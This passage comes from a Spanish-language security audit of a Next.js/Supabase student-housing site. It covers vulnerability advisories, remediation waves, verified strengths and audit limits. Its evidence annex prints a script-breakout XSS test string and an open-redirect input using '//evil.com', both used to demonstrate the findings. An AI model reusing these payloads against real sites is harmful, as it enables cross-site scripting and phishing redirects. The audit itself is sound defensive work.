| GHSA-4c39-4ccg-62r3 — payload de Server Action sin límite en Edge | Moderada | Parcial | No se usa runtime Edge en la acción; el payload sí está sin limitar |
| GHSA-gx5p-jg67-6x7h — XSS en scripts `beforeInteractive` con entrada no confiable | Moderada | No | No se usa `next/script` |
| GHSA-wfc6-r584-vfw7 / GHSA-68g3-v927-f742 / GHSA-4633-3j49-mh5q — *cache poisoning* / confusión de caché | Moderada | Parcial | El proyecto usa ISR + `revalidateTag`, por lo que conviene tratarlo como aplicable (sin explotación demostrada aquí) |
| GHSA-3g8h-86w9-wvmq — *cache poisoning* de redirecciones de middleware | Baja | **Sí** | Hay una redirección en middleware (`utils/supabase/middleware.ts:39-48`) |
| GHSA-vfv6-92ff-j949 — *cache poisoning* por colisiones en el *cache-busting* de RSC | Baja | Parcial | Ídem ISR |

**Conclusión de exposición:** de los 23 avisos, **12 aplican con exposición real y 3 de ellos (2 críticos + el DoS de Server Actions) son alcanzables sin autenticación**. Los 4 avisos de `postcss` merecen una nota aparte: el `postcss@8.4.31` embebido en `next` está afectado por GHSA-6g55-p6wh-862q y GHSA-r28c-9q8g-f849 (lectura arbitraria de archivos `.map`, CVSS 7.5). Su exposición real aquí es **baja**, porque `postcss` se ejecuta en tiempo de compilación sobre el CSS propio del proyecto y ningún CSS de terceros entra en el pipeline — pero desaparece al subir de versión y por eso aparece en el paquete reportado.

### 5.3 Ruta de corrección

1. **Hoy (15 min, sin cambiar de versión)**: quitar `image/avif` de `formats` y eliminar el comodín `hostname: "**"`. Esto neutraliza los dos avisos más graves sobre el optimizador de imágenes sin tocar la versión.
2. **Semana 1 (1–3 días)**: subir `next` a **≥15.5.24** (corrige AVIF, Windows RCE, el DoS de Server Actions y el XSS de CSP con nonces) o directamente a **16.3.5**, que es la corrección que `npm audit` ofrece. Se solapa con el plan ya propuesto en `docs/auditorias/tecnica-rendimiento.md` §4; **la diferencia es la prioridad: por seguridad es bloqueante de lanzamiento, no deuda a planificar.**
3. **Permanente**: `npm ci` + `npm audit --omit=dev --audit-level=high` en CI (S-07) y Dependabot activo, de modo que un aviso nuevo genere un PR en lugar de esperar a una auditoría manual.

---

## 6. Fortalezas verificadas (no romper)

Todo lo siguiente se comprobó en el código y **debe preservarse** en las correcciones propuestas:

1. **Ningún secreto en el repositorio**: `.env.local` solo contiene el número de WhatsApp (con las líneas de Supabase comentadas) y `.gitignore:23` cubre `.env*.local`. No hay `service_role` ni claves privadas en ninguna línea del proyecto.
2. **RLS activado con propiedad por fila** en las tres tablas, incluida la resolución del propietario de `habitaciones` a través de la pensión (`esquema.sql:135-170`) — un patrón correcto y no trivial.
3. **La identidad nunca sale del formulario**: `crearPension` toma el usuario de `supabase.auth.getUser()` (`app/actions/pensiones.ts:44-51`) y usa `anfitrion_id: user.id` (`:105`). No hay *mass assignment* del propietario.
4. **Defensa en profundidad en la autorización**: middleware (`middleware.ts`) + comprobación en el servidor de la página (`app/publicar/page.tsx:35-36`) + política RLS. Tres capas independientes.
5. **Protecciones del optimizador de imágenes bien elegidas**: `dangerouslyAllowSVG: false` (`next.config.mjs:15`) evita XSS por SVG y `contentDispositionType: "attachment"` (`:16`) evita la ejecución de contenido descargado. Son exactamente las dos que importan.
6. **`encodeURIComponent` en todos los enlaces de WhatsApp** (`lib/formato.ts:87`, `app/pensiones/[id]/page.tsx:173-175`) — sin él, títulos con `&` romperían el mensaje.
7. **`target="_blank"` acompañado de `rel="noopener noreferrer"`** (`app/pensiones/[id]/page.tsx:176-177`).
8. **Cierre de sesión por POST** (no por enlace), documentado con su razón en `app/auth/signout/route.ts:5`.
9. **Guardia de configuración** `esSupabaseConfigurado()` con validación de forma (`lib/supabase/config.ts:15-21`): evita fallos silenciosos por credenciales a medio pegar.
10. **Fuentes autoalojadas con `next/font`** (`app/layout.tsx:15-27`): el sitio **no envía ninguna petición a Google**, lo que reduce la superficie de terceros y facilita una CSP estricta (`font-src 'self'`).
11. **Service Worker propio, sin dependencias de terceros** (`public/sw.js`) con estrategias correctas por tipo de recurso y versionado de caché — sólo necesita el ajuste de S-08.
12. **`noindex` en las rutas privadas** (`login`, `registro`, `publicar`) y metadatos completos en las públicas.
13. **Frontera de error** (`app/error.tsx`) que evita la pantalla rota ante fallos de datos.
14. **Documentación operativa real**: `docs/integracion-supabase.md` incluye sección de reversión y de solución de problemas; los scripts de verificación (`verificar-seo`, `verificar-contraste`, `prueba-humo`) son una base sólida para el pipeline de CI que falta.

---

## 7. Plan de implementación

### Oleada 1 — Antes de lanzar (≈1 día)

| Orden | Acción | Hallazgo | Esfuerzo |
|---|---|---|---|
| 1 | Escapar el JSON-LD en los tres puntos de inyección + prueba de regresión | S-01 | 2 h |
| 2 | Quitar `image/avif` de `formats` y el comodín `hostname: "**"` | S-02 | 20 min |
| 3 | Cabeceras de seguridad + `poweredByHeader: false` (CSP sin nonces) | S-04 | 3 h |
| 4 | Quitar el fallback del número de WhatsApp y fallar el build si falta | S-05 | 30 min |
| 5 | `activa: false` por defecto + verificación de correo + límite por anfitrión | S-06 | 4 h |
| 6 | Corregir la validación de `destino` | S-09 | 30 min |
| 7 | Validar RLS con la *anon key* real y configurar *Redirect URLs* exactas en Supabase | §4.3, §4.1.9 | 1 h |

### Oleada 2 — Primera semana (≈3 días)

| Orden | Acción | Hallazgo |
|---|---|---|
| 1 | Migrar a `next` ≥15.5.24 (o 16.3.x): cierra 3 bloqueantes de seguridad de golpe | S-02, S-02b, S-03 |
| 2 | git + remoto privado + CI con `npm ci`, lint, tipos, build, `npm audit --audit-level=high`, scripts de verificación y Dependabot | S-07, S-17 |
| 3 | Endurecer el esquema (longitudes, cardinalidades, sólo HTTPS en imágenes, trigger de saneado) | S-10 |
| 4 | Ajustar el Service Worker (rutas privadas, `respuesta.ok`, purga al cerrar sesión) y subir `VERSION` | S-08 |
| 5 | Dominio canónico por variable de entorno + verificación post-despliegue | S-12 |

### Oleada 3 — Primer mes (≈1 semana)

| Orden | Acción | Hallazgo |
|---|---|---|
| 1 | Observabilidad: error tracking, `/api/health`, monitor externo, alerta de degradación al catálogo demo y alerta de coste | S-13 |
| 2 | Aviso de privacidad, términos, endpoint de borrado de cuenta y retención documentada | S-14 |
| 3 | Endurecer roles (`rol` no auto-asignable) y columnas sensibles | S-11 |
| 4 | Validación de origen en `signout`, lanzadores que sólo maten procesos propios | S-15, S-16 |
| 5 | Estrategia de respaldos de Supabase probada (restauración incluida) | §4.5 |

---

## Anexo A — Evidencia reproducible

Comandos ejecutados durante esta auditoría (todos de solo lectura; ninguno modifica el proyecto ni compila):

```powershell
# 1. Vulnerabilidades reales, separando paquetes de avisos
cd pensiones-unimagdalena
npm audit --json                # 2 paquetes (next, postcss); 23 avisos sobre next@14.2.35 + 4 sobre postcss 8.4.31

# 2. Versiones realmente instaladas
(Get-Content node_modules\next\package.json -Raw | ConvertFrom-Json).version                    # 14.2.35
(Get-Content node_modules\next\node_modules\postcss\package.json -Raw | ConvertFrom-Json).version # 8.4.31

# 3. Ausencia de cabeceras de seguridad (0 coincidencias)
Get-ChildItem -Recurse -File | Where-Object { $_.FullName -notmatch '\\node_modules\\|\\\.next\\' } |
  Select-String -Pattern 'Content-Security-Policy|X-Frame-Options|Strict-Transport|Referrer-Policy|Permissions-Policy|headers\(\)'

# 4. Ausencia de service_role
... Select-String -Pattern 'service_role|SUPABASE_SERVICE'    # 0 coincidencias

# 5. JSON.stringify no escapa '<' (base del XSS almacenado)
node -e "console.log(JSON.stringify({titulo:'</script><script>alert(1)</script>'}))"

# 6. La validación de 'destino' acepta URLs absolutas de otro origen
node -e "console.log('//evil.com'.startsWith('/'))"
node -e "console.log(new URL('//evil.com','https://sitio.com').href)"      # https://evil.com/

# 7. Estado del build (no hay artefacto válido)
Test-Path .next\BUILD_ID          # False
Test-Path .next\prerender-manifest.json   # False

# 8. Sin control de versiones
Test-Path .git                    # False

# 9. Copias de seguridad presentes en el árbol de trabajo (e incluyen .env.local)
Get-ChildItem ..\backups -Directory
```

**Fichas oficiales consultadas** (para no citar de memoria): `https://github.com/advisories/GHSA-2xp9-vwfh-vxw4`, `.../GHSA-p293-qw3h-jr36`, `.../GHSA-q4gf-8mx6-v5v3`, `.../GHSA-m99w-x7hq-7vfj`, `.../GHSA-9g9p-9gw9-jx7f` (CVE-2025-59471), además de las fichas OSV equivalentes.

## Anexo B — Límites declarados de esta auditoría

1. **No es una prueba de penetración.** No se atacó ningún entorno, ni local ni desplegado: los hallazgos se derivan de lectura de código, configuración y respuesta de herramientas oficiales. Un ejercicio de penetración sobre el entorno desplegado es un paso posterior y deseable antes de manejar datos reales de estudiantes.
2. **El modo dinámico no se probó en vivo** (no hay credenciales de Supabase). Todo el análisis de RLS es estático sobre `supabase/esquema.sql`; el comportamiento real de las políticas —y en particular la lectura anónima de fichas inactivas— **debe comprobarse con la *anon key* real** antes de publicar (paso §4.3.4).
3. **No se ejecutó ningún build ni servidor**, por la restricción de `.next` compartido. Las afirmaciones sobre comportamiento en ejecución (por ejemplo, cómo sirve el Service Worker una ruta privada) son análisis del código, no observación en vivo. El build tampoco existe hoy en disco, así que no había artefacto que inspeccionar.
4. **Las cifras de precios** (Vercel Pro \$20/mes por asiento de desarrollo; Supabase Pro desde \$25/mes por proyecto) provienen de las páginas de precios oficiales consultadas el 17/09/2026 y pueden cambiar; verifícalas al contratar.
5. **S-14 no es asesoría jurídica.** Señala ausencias verificables (no hay aviso de privacidad ni canal de supresión) y el marco aplicable en Colombia; la redacción y el alcance deben validarse con quien asuma la responsabilidad legal.
6. **No se duplican** los dominios ya auditados por el equipo: modelo de datos y migración → `docs/auditorias/datos-backend.md`; rendimiento y salto de Next → `docs/auditorias/tecnica-rendimiento.md`; UX/CRO y accesibilidad → `docs/auditorias/ux-cro.md`. Esta auditoría **añade la dimensión de seguridad** sobre los mismos artefactos y marca qué parte de esa deuda técnica es bloqueante de lanzamiento por seguridad.
